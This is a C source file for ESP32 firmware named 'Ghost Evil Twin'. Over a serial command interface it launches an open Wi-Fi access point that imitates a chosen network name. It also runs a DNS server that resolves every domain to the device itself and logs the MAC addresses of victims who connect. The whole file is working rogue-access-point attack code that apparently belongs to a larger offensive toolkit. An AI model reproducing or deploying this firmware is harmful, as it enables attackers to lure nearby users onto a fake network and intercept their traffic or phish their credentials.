#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/uart.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"

// UART2 — same pinout as all other Ghost modules
#define UART_PORT      UART_NUM_2
#define UART_TX_PIN    17
#define UART_RX_PIN    16
#define UART_BAUD_RATE 115200
#define BUF_SIZE       1024

static bool ap_running  = false;
static bool dns_running = false;
static TaskHandle_t dns_task_handle = NULL;

// ESP32 AP default gateway IP — all DNS replies point here
#define AP_IP "192.168.4.1"

// ── UART ─────────────────────────────────────────────────────────────────────

void uart_init() {
    uart_config_t cfg = {
        .baud_rate = UART_BAUD_RATE,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
    };
    uart_driver_install(UART_PORT, BUF_SIZE * 2, 0, 0, NULL, 0);
    uart_param_config(UART_PORT, &cfg);
    uart_set_pin(UART_PORT, UART_TX_PIN, UART_RX_PIN,
                 UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
}

void send(const char *msg) {
    uart_write_bytes(UART_PORT, msg, strlen(msg));
}

void sendf(const char *fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    send(buf);
    printf("%s", buf);
}

// ── WiFi event handler ────────────────────────────────────────────────────────

static void wifi_event_handler(void *arg, esp_event_base_t base,
                                int32_t event_id, void *data) {
    if (base != WIFI_EVENT) return;

    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
        sendf("TWIN:CLIENT_JOINED:%02X:%02X:%02X:%02X:%02X:%02X\n",
              e->mac[0], e->mac[1], e->mac[2],
              e->mac[3], e->mac[4], e->mac[5]);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t *e = (wifi_event_ap_stadisconnected_t *)data;
        sendf("TWIN:CLIENT_LEFT:%02X:%02X:%02X:%02X:%02X:%02X\n",
              e->mac[0], e->mac[1], e->mac[2],
              e->mac[3], e->mac[4], e->mac[5]);
    }
}

// ── System init — run once ────────────────────────────────────────────────────

void system_init() {
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                        wifi_event_handler, NULL, NULL);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
}

// ── DNS server — redirects every domain to AP_IP ─────────────────────────────
//
// DNS packet structure (RFC 1035):
//   Header: 12 bytes
//   Question: variable (name + type + class)
//   Answer: appended by us — name pointer + type + class + ttl + rdlength + rdata
//
// We read the full query, copy the header back with QR=1 (response) + AA=1,
// copy the question section verbatim, then append a single A record answer.

void dns_server_task(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        send("DNS:ERR_SOCKET\n");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in server_addr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    send("DNS:STARTED\n");
    dns_running = true;

    uint8_t buf[512];
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);

    while (dns_running) {
        int len = recvfrom(sock, buf, sizeof(buf) - 1, 0,
                           (struct sockaddr *)&client_addr, &client_len);
        if (len < 12) continue;

        // Build response in place — flip QR bit, set AA bit
        buf[2] |= 0x80;  // QR = 1 (response)
        buf[2] |= 0x04;  // AA = 1 (authoritative)
        buf[3]  = 0x00;  // RCODE = 0 (no error)

        // Answer count = 1
        buf[6] = 0x00;
        buf[7] = 0x01;

        // Find end of question section (skip past name + type + class)
        int pos = 12;
        while (pos < len && buf[pos] != 0x00) {
            if ((buf[pos] & 0xC0) == 0xC0) { pos += 2; break; }
            pos += buf[pos] + 1;
        }
        if (buf[pos] == 0x00) pos++;  // null terminator
        pos += 4;  // skip type + class (4 bytes)

        // Append answer: pointer to name in question (0xC00C), type A, class IN,
        // TTL 60s, rdlength 4, then the IP address
        uint32_t ip_addr;
        inet_aton(AP_IP, (struct in_addr *)&ip_addr);

        uint8_t answer[] = {
            0xC0, 0x0C,              // name pointer → offset 12 (question name)
            0x00, 0x01,              // type A
            0x00, 0x01,              // class IN
            0x00, 0x00, 0x00, 0x3C, // TTL 60 seconds
            0x00, 0x04,              // rdlength = 4 bytes
            (ip_addr)       & 0xFF,
            (ip_addr >> 8)  & 0xFF,
            (ip_addr >> 16) & 0xFF,
            (ip_addr >> 24) & 0xFF,
        };

        memcpy(buf + pos, answer, sizeof(answer));
        int resp_len = pos + sizeof(answer);

        sendto(sock, buf, resp_len, 0,
               (struct sockaddr *)&client_addr, client_len);
    }

    close(sock);
    send("DNS:STOPPED\n");
    vTaskDelete(NULL);
}

void start_dns() {
    dns_running = true;
    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_task_handle);
}

void stop_dns() {
    dns_running = false;
    dns_task_handle = NULL;
}

// ── Start fake AP with given SSID ─────────────────────────────────────────────

void start_ap(const char *ssid) {
    if (ap_running) {
        esp_wifi_stop();
        ap_running = false;
    }

    esp_netif_create_default_wifi_ap();

    wifi_config_t ap_cfg = {
        .ap = {
            .channel        = 6,
            .max_connection = 8,
            .authmode       = WIFI_AUTH_OPEN,  // open network — no password, like the real one
        },
    };
    // Copy SSID into config
    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid) - 1);
    ap_cfg.ap.ssid_len = strlen(ssid);

    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    esp_wifi_start();

    ap_running = true;
    sendf("TWIN:AP_STARTED:%s\n", ssid);

    // Start DNS server so every domain resolves to us
    start_dns();
}

// ── Stop AP ───────────────────────────────────────────────────────────────────

void stop_ap() {
    if (!ap_running) {
        send("TWIN:AP_NOT_RUNNING\n");
        return;
    }
    stop_dns();
    esp_wifi_stop();
    ap_running = false;
    send("TWIN:AP_STOPPED\n");
}

// ── Command handler ───────────────────────────────────────────────────────────

void handle_command(char *cmd) {
    for (int i = 0; cmd[i]; i++) {
        if (cmd[i] == '\n' || cmd[i] == '\r') cmd[i] = 0;
    }
    printf("CMD: [%s]\n", cmd);

    if (strncmp(cmd, "CMD:TWIN_START:", 15) == 0) {
        char *ssid = cmd + 15;
        if (strlen(ssid) == 0) {
            send("ERR:NO_SSID\n");
            return;
        }
        start_ap(ssid);

    } else if (strncmp(cmd, "CMD:TWIN_STOP", 13) == 0) {
        stop_ap();

    } else {
        send("ERR:UNKNOWN\n");
    }
}

// ── UART RX task ──────────────────────────────────────────────────────────────

void uart_rx_task(void *arg) {
    uint8_t data[BUF_SIZE];
    while (1) {
        int len = uart_read_bytes(UART_PORT, data, BUF_SIZE - 1, 20 / portTICK_PERIOD_MS);
        if (len > 0) {
            data[len] = 0;
            handle_command((char *)data);
        }
    }
}

// ── Entry point ───────────────────────────────────────────────────────────────

void app_main(void) {
    printf("Ghost Evil Twin booting...\n");

    uart_init();
    system_init();

    send("GHOST:READY\n");

    xTaskCreate(uart_rx_task, "uart_rx", 4096, NULL, 5, NULL);

    printf("Ready. Send CMD:TWIN_START:<ssid> to create a fake AP.\n");
}
